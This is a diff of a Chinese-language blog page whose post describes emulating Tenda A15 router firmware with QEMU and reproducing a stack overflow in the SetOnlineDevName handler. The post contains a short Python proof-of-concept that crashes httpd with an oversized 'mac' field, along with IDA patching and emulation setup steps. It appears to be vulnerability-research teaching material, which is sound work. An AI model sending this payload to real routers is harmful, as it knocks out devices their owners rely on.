@@ -35,7 +35,7 @@
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
     KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":true,"img_link":"/images/zfb.jpg","text":"请作者喝杯咖啡","icon":"/images/tea.svg"}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -45,6 +45,8 @@
 
 <body>
 <div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
     
 
     
@@ -119,9 +121,15 @@
                         </li>
                     
                     
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
                 </ul>
             </div>
             <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
                 <div class="icon-item menu-bar">
                     <div class="menu-bar-middle"></div>
@@ -273,6 +281,10 @@
         
         
         
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
     </div>
 
     
@@ -290,7 +302,12 @@
                          <h2 id="Tenda-A15-固件模拟与漏洞复现"><a href="#Tenda-A15-固件模拟与漏洞复现" class="headerlink" title="Tenda A15 固件模拟与漏洞复现"></a>Tenda A15 固件模拟与漏洞复现</h2><h3 id="环境检测"><a href="#环境检测" class="headerlink" title="环境检测"></a>环境检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;--- 1. 固件解包工具检测 ---&quot;</span><br><span class="line">which sasquatch</span><br><span class="line"></span><br><span class="line">echo -e &quot;\n--- 2. QEMU 模拟环境检测 ---&quot;</span><br><span class="line">qemu-mipsel-static --version</span><br><span class="line">qemu-system-mipsel --version</span><br><span class="line"></span><br><span class="line">echo -e &quot;\n--- 3. 调试工具检测 ---&quot;</span><br><span class="line">gdb-multiarch --version</span><br><span class="line"></span><br><span class="line">echo -e &quot;\n--- 4. 网络与依赖服务检测 ---&quot;</span><br><span class="line">brctl show</span><br><span class="line">systemctl is-active rpcbind</span><br></pre></td></tr></table></figure>
 
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405123942724.png"  alt="image-20260405123942724"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405123942724.png"
+                        alt="image-20260405123942724"
+                 ></p>
 <h3 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h3><p><a class="link"   target="_blank" rel="noopener" href="https://static.tenda.com.cn/tdeweb/download/A15/US_A15V1.0RTL_V15.13.07.13_multi_TD01.zip" >固件下载地址<i class="fas fa-external-link-alt"></i></a></p>
 <p>提取固件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me US_A15V1.0RTL_V15.13.07.13_multi_TD01.bin</span><br></pre></td></tr></table></figure>
@@ -299,7 +316,12 @@
 <p>查看程序信息</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file bin/httpd</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260406165054220.png"  alt="image-20260406165054220"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260406165054220.png"
+                        alt="image-20260406165054220"
+                 ></p>
 <p>将 x86 架构下的 MIPS 翻译器（QEMU）复制到当前假根目录中：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp $(which qemu-mipsel-static) .</span><br></pre></td></tr></table></figure>
 
@@ -308,7 +330,12 @@
 <p>使用 <code>chroot</code> 将当前目录作为根目录，启动 <code>httpd</code> 服务</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/httpd</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405130000716.png" ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405130000716.png"
+                       
+                 ></p>
 <p>没反应，ip地址错误，没有布置监听</p>
 <h3 id="文件系统修补"><a href="#文件系统修补" class="headerlink" title="文件系统修补"></a>文件系统修补</h3><p>在真实的 IoT 设备中，根文件系统（也就是提取出来的 <code>squashfs</code>）通常是<strong>只读的（Read-Only）</strong>。</p>
 <p>但是，<code>httpd</code> 服务在运行时，必须生成一些动态数据，比如：</p>
@@ -326,7 +353,12 @@
 <p><strong>加入 <code>strace</code> 发现的补丁</strong>：加上 <code>/proc</code>、<code>/sys</code>、<code>/dev</code> 的 <code>mount</code> 动作。</p>
 </blockquote>
 <p>下图是etc_ro中有init.d的rcS的内容</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405133225104.png"  alt="image-20260405133225104"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405133225104.png"
+                        alt="image-20260405133225104"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">mkdir -p ./var/etc</span><br><span class="line">mkdir -p ./var/media</span><br><span class="line">mkdir -p ./var/webroot</span><br><span class="line">mkdir -p ./var/etc/iproute</span><br><span class="line">mkdir -p ./var/run</span><br><span class="line">mkdir -p ./var/etc/udhcpc</span><br><span class="line">mkdir -p ./var/debug</span><br><span class="line">mkdir -p ./dev/pts</span><br><span class="line">mkdir -p ./var/ppp</span><br><span class="line">mkdir -p ./tmp</span><br><span class="line"></span><br><span class="line">cp -rf ./etc_ro/* ./var/etc/</span><br><span class="line">cp -rf ./webroot_ro/* ./var/webroot</span><br></pre></td></tr></table></figure>
 
 
@@ -343,36 +375,91 @@
 
 <h3 id="网卡接口配置"><a href="#网卡接口配置" class="headerlink" title="网卡接口配置"></a>网卡接口配置</h3><p>为了“伪造”出路由器程序赖以生存的硬件环境，并打通与该程序之间的通信链路，让固件正常运行，我们必须在 Linux 内核中伪造出它所需的网络拓扑</p>
 <p>静态分析看到应该是br0和80端口</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405162432190.png"  alt="image-20260405162432190"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405162432190.png"
+                        alt="image-20260405162432190"
+                 ></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo brctl addbr br0</span><br><span class="line">sudo ip addr add 192.168.0.1/24 dev br0</span><br><span class="line">sudo ip link set br0 up</span><br></pre></td></tr></table></figure>
 
 <p>然后再次执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./bin/httpd</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405130608713.png"  alt="image-20260405130608713"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405130608713.png"
+                        alt="image-20260405130608713"
+                 ></p>
 <h3 id="漏洞静态分析"><a href="#漏洞静态分析" class="headerlink" title="漏洞静态分析"></a>漏洞静态分析</h3><p><code>initWebs</code>是初始话web界面，并根据提交表单调用相应功能</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405173358412.png"  alt="image-20260405173358412"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405173358412.png"
+                        alt="image-20260405173358412"
+                 ></p>
 <p><strong>API 路由表</strong></p>
 <p>websFormDefine(“前端名字”, 后端C函数名)</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405171125420.png"  alt="image-20260405171125420"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405171125420.png"
+                        alt="image-20260405171125420"
+                 ></p>
 <p>大佬的说要多关注带有set的功能，因为大多数是需要接受前端数据，进行设置操作的，因此存在较高的安全风险</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405201342610.png"  alt="image-20260405201342610"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405201404699.png"  alt="image-20260405201404699"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405201342610.png"
+                        alt="image-20260405201342610"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405201404699.png"
+                        alt="image-20260405201404699"
+                 ></p>
 <p>分析处理<code>SetOnlineDevName</code> 请求的<code>formSetDeviceName</code> 函数，其中的<code>set_device_name</code>发现漏洞</p>
 <p>没有对字符串长度校验，使用<code>sprintf</code>会造成栈溢出漏洞导致程序崩溃</p>
 <p>在常规 Pwn 题里，接收输入的是 <code>read(0, buf, size)</code> 或者 <code>gets(buf)</code>，直接从标准输入流读。</p>
 <p>而在 Tenda 路由器的 <code>formSetDeviceName</code> 函数里，它绝对不会调用 <code>scanf</code> 或 <code>read</code> 等待你输入。<code>websFormHandler</code> 会把 HTTP POST 请求全部接收完毕，并解析成了内存里的一个字典结构</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import cyclic</span><br><span class="line"></span><br><span class="line">ip = &#x27;192.168.0.1&#x27; # 填网桥 IP</span><br><span class="line">url =  f&#x27;http://&#123;ip&#125;/goform/SetOnlineDevName&#x27;</span><br><span class="line"></span><br><span class="line"># 结合优势：攻击 mac 字段，并使用 4000 字节的超大探针！</span><br><span class="line">payload = &#123;</span><br><span class="line">  &quot;mac&quot;: cyclic(4000), </span><br><span class="line">  &quot;devName&quot;: &quot;devname1&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(&quot;[*] 正在发送 4000 字节的终极探针...&quot;)</span><br><span class="line">try:</span><br><span class="line">    requests.post(url=url , data=payload, timeout=2)</span><br><span class="line">except Exception:</span><br><span class="line">    print(&quot;[+] 目标已彻底断开，绝对当场暴毙！&quot;)</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405173515491.png"  alt="image-20260405173515491"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405173515491.png"
+                        alt="image-20260405173515491"
+                 ></p>
 <p>但是运行结果非预期，程序并没有崩溃，还打印了信息<strong>device name setted failed!<strong>和</strong>set device name error!</strong></p>
 <p>在ida中追踪发现是调用<code>tpi_set_mac_info</code>失败</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405201730557.png"  alt="image-20260405201730557"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405201730557.png"
+                        alt="image-20260405201730557"
+                 ></p>
 <p>可以用IDA进行patch，直接把跳转指令nop掉就达到我们的目的了</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405202219689.png"  alt="image-20260405202219689"></p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405202259165.png"  alt="image-20260405202259165"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405202219689.png"
+                        alt="image-20260405202219689"
+                 ></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405202259165.png"
+                        alt="image-20260405202259165"
+                 ></p>
 <p>之后再运行就可以了</p>
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405171551152.png"  alt="image-20260405171551152"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260405171551152.png"
+                        alt="image-20260405171551152"
+                 ></p>
 <h3 id="系统模拟对比"><a href="#系统模拟对比" class="headerlink" title="系统模拟对比"></a>系统模拟对比</h3><p>系统级模拟（System-mode Emulation）相当于在 Kali 里用 VMware 跑了一个完整的虚拟机。</p>
 <table>
 <thead>
@@ -520,7 +607,12 @@
 <p>脚本要把ip地址改一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from pwn import cyclic</span><br><span class="line"></span><br><span class="line">ip = &#x27;10.10.10.3&#x27; # 填网桥 IP</span><br><span class="line">url =  f&#x27;http://&#123;ip&#125;/goform/SetOnlineDevName&#x27;</span><br><span class="line"></span><br><span class="line"># 结合优势：攻击 mac 字段，并使用 4000 字节的超大探针！</span><br><span class="line">payload = &#123;</span><br><span class="line">  &quot;mac&quot;: cyclic(4000), </span><br><span class="line">  &quot;devName&quot;: &quot;devname1&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print(&quot;[*] 正在发送 4000 字节的终极探针...&quot;)</span><br><span class="line">try:</span><br><span class="line">    requests.post(url=url , data=payload, timeout=2)</span><br><span class="line">except Exception:</span><br><span class="line">    print(&quot;[+] 目标已彻底断开，绝对当场暴毙！&quot;)</span><br></pre></td></tr></table></figure>
 
-<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260406163500770.png"  alt="image-20260406163500770"></p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260406163500770.png"
+                        alt="image-20260406163500770"
+                 ></p>
 <p>最后再放一个模板</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"># ==============================================</span><br><span class="line"># QEMU MIPSEL Debian Squeeze 虚拟机安装脚本（带校验功能）</span><br><span class="line"># 适用于嵌入式开发/逆向工程环境搭建</span><br><span class="line"># ==============================================</span><br><span class="line"></span><br><span class="line"># 配置参数</span><br><span class="line">WORK_DIR=&quot;debian-mipsel-qemu&quot;</span><br><span class="line">IMAGE_FILE=&quot;debian_squeeze_mipsel_standard.qcow2&quot;</span><br><span class="line">KERNEL_FILE=&quot;vmlinux-2.6.32-5-4kc-malta&quot;</span><br><span class="line">START_SCRIPT=&quot;start.sh&quot;</span><br><span class="line"></span><br><span class="line"># 1. 创建工作目录（如果不存在）</span><br><span class="line">if [ ! -d &quot;$WORK_DIR&quot; ]; then</span><br><span class="line">    echo &quot;创建目录 $WORK_DIR...&quot;</span><br><span class="line">    mkdir -p &quot;$WORK_DIR&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cd &quot;$WORK_DIR&quot; || &#123; echo &quot;无法进入目录 $WORK_DIR&quot;; exit 1; &#125;</span><br><span class="line"></span><br><span class="line"># 2. 下载镜像文件（如果不存在）</span><br><span class="line">download_file() &#123;</span><br><span class="line">    local url=$1</span><br><span class="line">    local file=$2</span><br><span class="line">    if [ ! -f &quot;$file&quot; ]; then</span><br><span class="line">        echo &quot;正在下载 $file...&quot;</span><br><span class="line">        wget &quot;$url&quot; -O &quot;$file&quot; || &#123; echo &quot;下载失败&quot;; exit 1; &#125;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;$file 已存在，跳过下载&quot;</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">download_file &quot;https://people.debian.org/~aurel32/qemu/mipsel/$IMAGE_FILE&quot; &quot;$IMAGE_FILE&quot;</span><br><span class="line">download_file &quot;https://people.debian.org/~aurel32/qemu/mipsel/$KERNEL_FILE&quot; &quot;$KERNEL_FILE&quot;</span><br><span class="line"></span><br><span class="line"># 3. 生成或覆盖启动脚本</span><br><span class="line">echo &quot;生成启动脚本...&quot;</span><br><span class="line">cat &gt; &quot;$START_SCRIPT&quot; &lt;&lt; &#x27;EOF&#x27;</span><br><span class="line">#!/bin/bash</span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -nographic \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -net nic,macaddr=52:54:00:12:34:56 \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot;</span><br><span class="line">EOF</span><br><span class="line">chmod +x &quot;$START_SCRIPT&quot;</span><br><span class="line"></span><br><span class="line"># 4. 检查是否所有文件都已准备就绪</span><br><span class="line">required_files=(&quot;$IMAGE_FILE&quot; &quot;$KERNEL_FILE&quot; &quot;$START_SCRIPT&quot;)</span><br><span class="line">missing_files=()</span><br><span class="line"></span><br><span class="line">for file in &quot;$&#123;required_files[@]&#125;&quot;; do</span><br><span class="line">    if [ ! -f &quot;$file&quot; ]; then</span><br><span class="line">        missing_files+=(&quot;$file&quot;)</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">if [ $&#123;#missing_files[@]&#125; -ne 0 ]; then</span><br><span class="line">    echo &quot;错误：以下文件缺失:&quot;</span><br><span class="line">    printf &#x27; - %s\n&#x27; &quot;$&#123;missing_files[@]&#125;&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># 5. 启动虚拟机</span><br><span class="line">echo &quot;正在启动QEMU虚拟机...&quot;</span><br><span class="line">./&quot;$START_SCRIPT&quot;</span><br></pre></td></tr></table></figure>
 
@@ -548,8 +640,44 @@
                     </div>
                     <div>
                         
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
                     </div>
                 </div>
+
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/zfb.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="/images/tea.svg"></i>&nbsp;请作者喝杯咖啡
+    </div>
+</div>
 
                 
 
@@ -740,6 +868,19 @@
     
 
     
+        <div class="count-info info-item">
+            
+
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
 
     
 </footer>
@@ -842,6 +983,35 @@
 
     <!-- local search -->
     
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
 
     <!-- tablet toc -->
     
@@ -881,8 +1051,16 @@
 
 <!-- local search -->
 
+    
+<script src="/js/local-search.js"></script>
+
+
 
 <!-- lazyload -->
+
+    
+<script src="/js/lazyload.js"></script>
+
 
 
 <div class="">
@@ -907,6 +1085,10 @@
         
 
         <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
         
     
 
